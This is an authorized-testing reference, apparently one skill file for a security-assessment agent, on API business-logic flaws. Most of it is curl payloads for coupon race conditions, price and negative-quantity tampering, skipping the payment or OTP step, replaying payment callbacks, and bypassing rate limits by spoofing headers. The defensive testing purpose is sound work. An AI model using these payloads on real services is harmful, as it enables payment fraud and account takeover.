# API Business Logic Vulnerability Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

API business logic vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Race Condition | ✓ Concurrent request test | - | Actual financial exploitation |
| Limit Bypass | ✓ Prove limit can be exceeded | - | Execute multiple real transactions |
| Price Manipulation | ✓ Modify request to prove flaw | - | Complete fraudulent purchase |
| Coupon Abuse | ✓ Test reuse mechanism | - | Actually redeem multiple times |

**Safe Validation Method**: Prove vulnerability exists; do not complete exploitative transactions.

### Concurrent Request Exploitation
```bash
# Balance deduction/coupon usage/voting (send multiple requests concurrently using curl)
# Goal: Bypass limits, e.g., use 1 coupon limit but send 10 concurrent requests
curl -s -X POST "https://api.example.com/v1/coupons/apply" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"code":"WELCOME50"}' & \
curl -s -X POST "https://api.example.com/v1/coupons/apply" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"code":"WELCOME50"}' & \
wait
```

### Single Request Exploitation (HTTP/1.1 Pipeline)
```bash
# Use tools like Turbo Intruder or HTTP pipelining to send compact request packets
# Can send multiple HTTP requests continuously in a single TCP connection, reducing network latency variance
```

## Parameter Tampering

### Price Tampering
```bash
# Modify price field in request
curl -X POST "https://api.example.com/v1/cart/add" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"product_id":101, "quantity":1, "price":0.01}'
```

### Quantity Tampering
```bash
# Negative quantity (may cause total price reduction or refund logic anomalies)
curl -X POST "https://api.example.com/v1/cart/add" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"product_id":101, "quantity":-1}'

# Large quantity (integer overflow test)
curl -X POST "https://api.example.com/v1/cart/add" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"product_id":101, "quantity":2147483647}'
```

### Order Status Tampering
```bash
# Directly modify order status in request
curl -X PUT "https://api.example.com/v1/orders/8899" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"status":"PAID"}'
```

## Step Skipping

### Skip Payment Step
```bash
# Normal flow: 1.Add to cart -> 2.Confirm order -> 3.Pay -> 4.Complete order
# Attack flow: 1.Add to cart -> 2.Confirm order -> 4.Directly call complete order endpoint
curl -X POST "https://api.example.com/v1/orders/8899/complete" \
     -H "Authorization: Bearer <token>"
```

### Skip Verification Step
```bash
# Normal flow: 1.Enter phone -> 2.Verify OTP -> 3.Reset password
# Attack flow: 1.Enter phone -> 3.Directly call reset password endpoint
curl -X POST "https://api.example.com/v1/password/reset" \
     -H "Content-Type: application/json" \
     -d '{"phone":"<authorized_test_phone>", "new_password":"Password1!"}'
```

## Replay Attack

### Replay Payment Callback
```bash
# Capture successful callback request from payment gateway, replay multiple times to increase account balance
curl -X POST "https://api.example.com/v1/callbacks/payment" \
     -H "Content-Type: application/json" \
     -d '{"order_id":"8899", "status":"success", "amount":100, "sign":"..."}'
```

### Replay OTP Verification
```bash
# Intercept and replay successful OTP verification request for binding other accounts or bypassing subsequent verification
curl -X POST "https://api.example.com/v1/verify/otp" \
     -H "Content-Type: application/json" \
     -d '{"phone":"<authorized_test_phone>", "code":"123456"}'
```

### Missing Nonce/Timestamp
```bash
# Check if API requests lack anti-replay mechanisms (e.g., timestamp, nonce)
# If missing, use Burp Repeater to replay critical operation requests directly
```

## Logic Bypass

### Email/Phone Verification Bypass
```bash
# Modify response packet to bypass frontend verification
# Change {"status":"error", "msg":"Invalid OTP"} to {"status":"success"}

# Try using array or special type to bypass backend verification
curl -X POST "https://api.example.com/v1/verify" \
     -H "Content-Type: application/json" \
     -d '{"code": [123456]}'
```

### Rate Limit Bypass
```bash
# IP rotation (use proxy pool or X-Forwarded-For spoofing)
curl -X POST "https://api.example.com/v1/login" \
     -H "X-Forwarded-For: 192.0.2.10" \
     -d '{"username":"admin", "password":"123"}'

# Header modification bypass
# Try adding: X-Originating-IP, X-Remote-IP, X-Remote-Addr, X-Client-IP
```

## Analysis Process

1. Map core business flows (e.g., registration, login, shopping, payment, password reset)
2. Identify key parameters in flows (price, quantity, status, step identifiers)
3. Attempt to tamper with key parameters, observe if backend validates strictly
4. Try disrupting API call sequence, skip intermediate verification steps
5. For endpoints involving assets/state changes, test concurrent requests (race condition)
6. Capture critical operation requests, test if unlimited replay is possible

## Output

- Proof payload
- Complete request packet (HTTP format)
- Screenshot/log proof of successful business logic bypass or tampering

## Severity Classification

API business logic severity is based on "real impact on funds or assets" — money-impacting issues default to medium/high severity, but must distinguish "proving tampering is possible" from "completing real arbitrage/fraud". 

| Actual case | Severity | Note |
|---------|------|------|
| fund/asset operation tampering confirmed (price changed to 0/negative value accepted/payment skipped/callback replay/concurrent balance increase succeeds) | High | direct financial loss |
| logic flaw exists but impact is limited (Proof onlytampering possible/no real transaction completed/not actually credited) | Medium | proof-level, arbitrage/fraud chain not closed |
| only discovery ofsuspicious logic (parameter can be changed but backend rejects it/flow appears skippable) | Low | Pending confirmation |
| step can be skipped but is not financial or critical | Low | limited impact |
| repeatable cash-out / large-scale asset transfer | Critical | financial loss |

**Key judgment**:Reporting High requires confirming"fund/asset operation was actually accepted by the backend". the request was only sent but the server rejected it/or only one demonstration was performed without actual crediting, record as Medium. Do not complete real fraudulent transactions. 

---

## Prohibited

- ⚠️ No actual fund theft or malicious consumption
- ⚠️ No damage to normal business data state
- ⚠️ Only prove existence + provide command/PoC
